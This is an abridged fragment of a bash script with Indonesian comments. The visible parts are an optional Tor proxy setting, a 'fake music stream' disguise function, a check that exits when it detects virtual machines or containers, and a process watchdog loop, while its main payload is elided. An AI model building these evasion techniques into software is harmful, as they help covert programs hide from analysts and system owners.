...
# Pastikan torsocks tersedia jika ingin proxy
USE_SOCKS5=false
TOR_CMD=""
...
# Simulasi pemutaran musik palsu (nama acak)
fake_music_stream() {
...
# Deteksi virtual/debug env
anti_debug() {
    if grep -qaE 'docker|lxc|hypervisor|vmware|qemu|kvm' /proc/cpuinfo /proc/1/cgroup /proc/self/status; then
        echo "[!] Virtualized/debugging environment detected. Exiting..." | tee -a "$LOGFILE"
        exit 1
    fi
}
    ...
    while true; do
        ...
        while sleep 25; do
            if ! ps -p $PID > /dev/null; then
                ...
                kill $KPID $FPID 2>/dev/null || true
                sleep 3
                break
            fi
        done
